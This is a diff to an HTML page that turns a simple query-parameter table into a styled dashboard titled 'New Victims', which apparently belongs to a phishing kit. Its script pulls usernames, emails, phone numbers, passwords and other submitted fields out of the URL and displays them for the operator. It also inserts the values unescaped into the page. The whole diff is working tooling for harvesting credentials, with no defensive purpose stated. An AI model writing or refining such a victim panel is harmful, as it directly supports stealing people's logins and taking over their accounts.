@@ -1,21 +1,107 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>View Details</title>
+<meta charset="UTF-8">
+<title>Dashboard</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+  body{
+    font-family: Arial, sans-serif;
+    background:#0d1117;
+    color:#e6edf3;
+    padding:20px;
+  }
+  .card{
+    background:#161b22;
+    border-radius:8px;
+    padding:16px;
+    max-width:700px;
+    margin:auto;
+    box-shadow:0 0 10px rgba(0,0,0,0.4);
+  }
+  h2{
+    color:#ff4d4d;
+    margin-bottom:14px;
+  }
+  .item{
+    margin-bottom:14px;
+    padding-bottom:10px;
+    border-bottom:1px solid #30363d;
+  }
+  .label{
+    font-weight:bold;
+    color:#58a6ff;
+  }
+  .value{
+    margin-left:10px;
+    color:#c9d1d9;
+    word-break:break-word;
+  }
+</style>
 </head>
+
 <body>
 
-<table border="1" id="output"></table>
+<div class="card">
+  <h2>🧨 New Victims</h2>
+  <div id="output"></div>
+</div>
 
 <script>
 const params = new URLSearchParams(window.location.search);
-const table = document.getElementById("output");
+const output = document.getElementById("output");
 
-if (params.toString()) {
-  table.innerHTML = "<tr><th>Field</th><th>Value</th></tr>";
-  params.forEach((value, key) => {
-    table.innerHTML += `<tr><td>${key}</td><td>${value}</td></tr>`;
-  });
+let username = "";
+let password = "";
+let extras = [];
+
+params.forEach((value, key) => {
+  const k = key.toLowerCase();
+
+  if (
+    k.includes("user") ||
+    k.includes("email") ||
+    k.includes("phone")
+  ) {
+    username = value;
+  }
+  else if (k.includes("pass")) {
+    password = value;
+  }
+  else {
+    extras.push({ key, value });
+  }
+});
+
+if (!params.toString()) {
+  output.innerHTML = "<p>No data received.</p>";
+} else {
+  let html = "";
+
+  html += `
+  <div class="item">
+    <div class="label">1. Email / Phone / Username</div>
+    <div class="value">${username || "—"}</div>
+  </div>`;
+
+  html += `
+  <div class="item">
+    <div class="label">2. Password</div>
+    <div class="value">${password || "—"}</div>
+  </div>`;
+
+  html += `
+  <div class="item">
+    <div class="label">3. Extra Submitted Details</div>
+    <div class="value">
+      ${extras.length
+        ? extras.map(e => `${e.key}: ${e.value}`).join("<br>")
+        : "—"}
+    </div>
+  </div>`;
+
+  output.innerHTML = html;
 }
 </script>
 
